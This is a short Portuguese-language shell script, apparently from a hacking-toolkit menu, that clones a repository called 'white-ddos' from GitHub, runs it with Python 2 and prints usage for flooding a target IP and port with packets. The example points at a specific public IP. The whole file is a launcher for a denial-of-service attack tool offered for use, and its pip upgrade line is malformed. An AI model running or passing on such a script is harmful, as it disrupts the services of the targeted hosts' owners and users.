echo "*LIMPANDO TERMINAL" | figlet | lolcat
sleep 1
clear
echo "*INSTALANDO DEPEDENCIAS" | figlet | lolcat
pip install -upgrade pip
clear
echo "{*CONCLUIDO*}" | figlet | lolcat
clear
echo "BAIXANDO: WHITE-DDOS" | figlet | lolcat
echo "(isso pode demorar um pouco, dependendo do sua conexão...)" | lolcat
cd $HOME/foxys_blt/downloads
git clone https://github.com/WH1T3-E4GL3/white-ddos.git
echo "FINALIZADO, EXECUTANDO SCRIPT :)" | figlet | lolcat
cd white-ddos && git pull
echo "Obrigado por usar nossa plataforma, volte sempre" | figlet | lolcat
python2 white-ddos.py
echo "COMO USAR ESSA FERRAMENTA?: Siga os exemplos abaixo" | lolcat
echo "python2 white-ddos.py <IP> <PORT> <PACKETS>" | lolcat 
echo "EXEMPLO: python2 white-ddos.py 104.27.190.77 8080 100" | lolcat
echo " Target IP : 104.27.190.77" | lolcat
echo "  Port      : 8080" | lolcat
echo "  Packet    : 100" | lolcat
